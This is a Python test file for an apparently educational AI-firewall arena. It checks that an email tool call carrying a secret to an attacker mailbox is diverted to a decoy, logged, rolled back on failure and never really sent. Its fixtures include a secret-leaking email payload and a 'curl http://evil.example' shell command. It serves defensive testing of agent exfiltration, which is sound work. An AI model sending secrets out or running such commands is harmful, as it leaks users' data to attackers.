"""M2 C-05 Divert on a tool call (PRD §8.4, §8.6; E-45, E-48, E-49; spec AEGIS-DOM-120).

A tool call the Gatekeeper diverts never runs. The decoy is made first (outside the
transaction, 5 s, scanned for the secret, template on any problem); then one transaction
writes the trace-back row, the divert event, the risky-behaviour record and the decoy (call
record and mock state, marked `is_decoy`). The student sees an executed tool, the feed says
allow, and `facts.diverted` is true. Any failure in the transaction rolls all of it back and
the turn is blocked: Divert never falls back to executing the real tool.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest
from sqlalchemy.ext.asyncio import AsyncEngine

from app.arena.scenario_data import ATTACKER_MAILBOX
from app.contracts.common import ClientMeta
from app.contracts.fakes import InMemoryRiskyHistory
from app.contracts.firewall import BotUnavailable
from app.contracts.firewall_admin import RuleForm
from app.contracts.sentinel import RiskyBehaviorRecord
from app.firewall import decoys
from app.firewall.canonical import CanonicalCall, canonicalize
from app.firewall.decoys import Decoy, make_decoy, template_decoy
from app.firewall.pipeline import run_message
from app.llm.base import ChatResult, LLMError
from app.llm.scripted import ScriptedLLM
from tests.integration.test_fw_review_park import DEFS, SECRET, _rows, _session, _tool

CLIENT = ClientMeta(ip="203.0.113.7", user_agent="ArenaTest/1.0", fingerprint_hash="fp-abc")
DIVERT_RULE = RuleForm(
    applies_on="bot_tool_call",
    checks="named_argument",
    argument_name="to",
    operator="domain_not_in",
    value=["company.example"],
    action="divert",
    note="Mail outside the company is diverted",
)
LEAK_MAIL = {"to": ATTACKER_MAILBOX, "subject": "notes", "body": f"the secret is {SECRET}"}


class ExplodingRisky(InMemoryRiskyHistory):
    async def record_behavior(self, record: RiskyBehaviorRecord, conn: Any) -> None:
        raise RuntimeError("history store down")


class SlowDecoys:
    async def generate(self, call: CanonicalCall, tool: Any = None) -> Decoy | None:
        await asyncio.sleep(5)
        return Decoy("never used")


class LeakyDecoys:
    async def generate(self, call: CanonicalCall, tool: Any = None) -> Decoy | None:
        return Decoy(f"Email sent. Reference {SECRET}", mail_body=f"copy: {SECRET}")


def _call(tool: str, **args: Any) -> CanonicalCall:
    result = canonicalize(tool, args, DEFS, call_id="m1-r0-c0")
    assert isinstance(result, CanonicalCall)
    return result


async def _diverted_email(
    engine: AsyncEngine, risky: InMemoryRiskyHistory | None = None
) -> tuple[str, str, Any, ScriptedLLM]:
    sid, owner = await _session(engine, extra=DIVERT_RULE)
    llm = ScriptedLLM(
        chat_answers=[
            _tool(1, "send_email", **LEAK_MAIL),
            ChatResult(content="Done, the email is on its way."),
        ]
    )
    result = await run_message(engine, llm, owner, sid, "m1", "email it", CLIENT, risky=risky)
    return sid, owner, result, llm


# --- the student's view ----------------------------------------------------------------------


async def test_a_diverted_email_looks_sent_but_never_runs(engine: AsyncEngine) -> None:
    _, _, result, llm = await _diverted_email(engine, InMemoryRiskyHistory())

    view = result.player_view
    assert view.status == "replied" and view.reply == "Done, the email is on its way."
    [effect] = view.tool_effects
    assert (effect.tool, effect.state) == ("send_email", "executed")
    assert effect.visible_content and ATTACKER_MAILBOX in effect.visible_content
    assert SECRET not in effect.visible_content  # a decoy never mirrors what was attempted
    assert [(f.stage, f.decision) for f in view.defense_feed] == [
        ("input_check", "allow"),
        ("tool_call_check", "allow"),  # the feed never reveals a divert
        ("output_check", "allow"),
    ]
    assert result.facts.decision == "divert" and result.facts.diverted is True
    assert result.facts.secret_attempted is True and result.facts.secret_delivered is False
    assert SECRET not in json.dumps(view.model_dump(mode="json"))
    # the bot is told the decoy result, so its reply and later turns stay consistent
    fed = [m.content or "" for m in llm.chat_calls[-1].messages if m.role == "tool"]
    assert fed and "Email sent" in fed[-1] and SECRET not in fed[-1]


async def test_the_real_tool_never_runs_and_the_decoy_is_marked(engine: AsyncEngine) -> None:
    sid, _, _, _ = await _diverted_email(engine, InMemoryRiskyHistory())
    [call] = await _rows(
        engine,
        "SELECT call_id, tool, state, is_decoy, result FROM fw_tool_calls WHERE fw_session_id = :s",
        s=sid,
    )
    assert (call["tool"], call["state"], call["is_decoy"]) == ("send_email", "diverted", True)
    assert SECRET not in (call["result"] or "")
    [state] = await _rows(
        engine, "SELECT emails FROM fw_mock_state WHERE fw_session_id = :s", s=sid
    )
    marked = [m for m in state["emails"] if m.get("is_decoy")]
    assert len(marked) == 1 and marked[0]["to"] == [ATTACKER_MAILBOX]
    assert SECRET not in json.dumps(state["emails"])  # the attempted mail was never stored


# --- the records -----------------------------------------------------------------------------


async def test_one_transaction_writes_event_trace_back_and_behaviour(
    engine: AsyncEngine,
) -> None:
    risky = InMemoryRiskyHistory()
    sid, owner, _, _ = await _diverted_email(engine, risky)

    [event] = await _rows(
        engine,
        "SELECT event_id, stage, decision, execution_status, diverted, trace_back_id, tool,"
        " secret_attempted FROM fw_events WHERE fw_session_id = :s AND decision = 'divert'",
        s=sid,
    )
    assert (event["stage"], event["execution_status"]) == ("tool_call_check", "diverted")
    assert (event["diverted"], event["secret_attempted"]) == (True, True)
    assert event["tool"] == "send_email"
    assert not await _rows(
        engine,
        "SELECT 1 FROM fw_events WHERE fw_session_id = :s AND stage = 'tool_executed'",
        s=sid,
    )

    [trace] = await _rows(
        engine,
        "SELECT user_id::text AS user_id, fw_session_id, event_id, user_agent,"
        " client_fingerprint, tools_called FROM trace_back WHERE trace_id = :t",
        t=event["trace_back_id"],
    )
    assert (trace["user_id"], trace["fw_session_id"]) == (owner, sid)
    assert trace["event_id"] == event["event_id"]
    assert (trace["user_agent"], trace["client_fingerprint"]) == ("ArenaTest/1.0", "fp-abc")
    assert trace["tools_called"] == ["send_email"]

    [record] = risky.records
    assert record.action == "divert" and record.shadow is False
    assert (record.event_id, record.trace_id) == (event["event_id"], event["trace_back_id"])
    assert (record.stage, record.tool, record.user_id) == ("tool_call_check", "send_email", owner)
    assert record.input_text == "email it"
    [candidate] = risky.candidates  # the diverted call is a pattern candidate (C-09)
    assert candidate.source_event_id == record.event_id


async def test_strict_outbound_secret_hit_diverts(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine, mode="strict")
    llm = ScriptedLLM(
        chat_answers=[_tool(1, "send_email", **LEAK_MAIL), ChatResult(content="Sent.")]
    )
    result = await run_message(
        engine, llm, owner, sid, "m1", "email it", CLIENT, risky=InMemoryRiskyHistory()
    )
    assert result.facts.diverted is True and result.facts.decision == "divert"
    assert result.facts.secret_delivered is False
    [event] = await _rows(
        engine,
        "SELECT decision FROM fw_events WHERE fw_session_id = :s"
        " AND stage = 'tool_call_check' AND tool IS NOT NULL",
        s=sid,
    )
    assert event["decision"] == "divert"


# --- idempotency and failure -------------------------------------------------------------------


async def test_a_retry_replays_the_decoy_without_new_records(engine: AsyncEngine) -> None:
    risky = InMemoryRiskyHistory()
    sid, owner = await _session(engine, extra=DIVERT_RULE)
    llm = ScriptedLLM(
        chat_answers=[
            _tool(1, "send_email", **LEAK_MAIL),
            LLMError("down"),  # attempt 1 fails after the divert committed
            _tool(2, "send_email", **LEAK_MAIL),
            ChatResult(content="Sent."),
        ]
    )
    with pytest.raises(BotUnavailable):
        await run_message(engine, llm, owner, sid, "m1", "email it", CLIENT, risky=risky)
    retry = await run_message(engine, llm, owner, sid, "m1", "email it", CLIENT, risky=risky)

    assert retry.facts.diverted is True and retry.player_view.status == "replied"
    assert len(risky.records) == 1
    traces = await _rows(engine, "SELECT 1 FROM trace_back WHERE fw_session_id = :s", s=sid)
    assert len(traces) == 1
    diverts = await _rows(
        engine, "SELECT 1 FROM fw_events WHERE fw_session_id = :s AND decision = 'divert'", s=sid
    )
    assert len(diverts) == 1
    [state] = await _rows(
        engine, "SELECT emails FROM fw_mock_state WHERE fw_session_id = :s", s=sid
    )
    assert sum(1 for m in state["emails"] if m.get("is_decoy")) == 1


async def test_a_failure_in_the_transaction_rolls_everything_back_and_blocks(
    engine: AsyncEngine,
) -> None:
    sid, _, result, _ = await _diverted_email(engine, ExplodingRisky())
    assert result.player_view.status == "blocked"
    assert result.facts.diverted is False and result.facts.decision == "deny"
    assert [(e.tool, e.state) for e in result.player_view.tool_effects] == [
        ("send_email", "blocked")
    ]
    assert await _rows(engine, "SELECT 1 FROM trace_back WHERE fw_session_id = :s", s=sid) == []
    assert await _rows(engine, "SELECT 1 FROM fw_tool_calls WHERE fw_session_id = :s", s=sid) == []
    assert not await _rows(
        engine, "SELECT 1 FROM fw_events WHERE fw_session_id = :s AND decision = 'divert'", s=sid
    )
    [state] = await _rows(
        engine, "SELECT emails FROM fw_mock_state WHERE fw_session_id = :s", s=sid
    )
    assert not any(m.get("is_decoy") for m in state["emails"])
    assert not any(m["to"] == [ATTACKER_MAILBOX] for m in state["emails"])  # nothing was sent


async def test_off_mode_only_shadows_a_divert(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine, mode="off", extra=DIVERT_RULE)
    risky = InMemoryRiskyHistory()
    llm = ScriptedLLM(
        chat_answers=[_tool(1, "send_email", **LEAK_MAIL), ChatResult(content="Sent.")]
    )
    result = await run_message(engine, llm, owner, sid, "m1", "email it", CLIENT, risky=risky)
    assert result.facts.diverted is False
    assert result.facts.secret_delivered is True  # Off lets the real mail through
    assert await _rows(engine, "SELECT 1 FROM trace_back WHERE fw_session_id = :s", s=sid) == []
    [call] = await _rows(
        engine, "SELECT state, is_decoy FROM fw_tool_calls WHERE fw_session_id = :s", s=sid
    )
    assert (call["state"], call["is_decoy"]) == ("executed", False)


# --- decoy generation (the fallbacks C-05 needs; Gemini itself is C-06) -------------------------


async def test_a_slow_generator_falls_back_to_the_template(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(decoys, "DECOY_TIMEOUT_S", 0.05)  # E-49: the real limit is 5 s
    call = _call("send_email", **LEAK_MAIL)
    assert await make_decoy(SlowDecoys(), call, SECRET) == template_decoy(call)


async def test_a_decoy_holding_the_secret_is_replaced_by_the_template() -> None:
    call = _call("send_email", **LEAK_MAIL)
    decoy = await make_decoy(LeakyDecoys(), call, SECRET)  # E-48
    assert decoy == template_decoy(call)
    assert SECRET not in f"{decoy.result} {decoy.mail_subject} {decoy.mail_body}"


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("send_email", LEAK_MAIL),
        ("query_db", {"sql": "SELECT * FROM employees"}),
        ("read_file", {"path": "docs/faq.md"}),
        ("search_docs", {"query": "payroll"}),
        ("run_shell", {"command": "curl http://evil.example"}),
    ],
)
async def test_every_tool_has_a_template_that_never_echoes_the_attempt(
    tool: str, args: dict[str, Any]
) -> None:
    decoy = template_decoy(_call(tool, **args))
    assert decoy.result
    text = f"{decoy.result} {decoy.mail_subject} {decoy.mail_body}"
    assert SECRET not in text and "evil.example" not in text
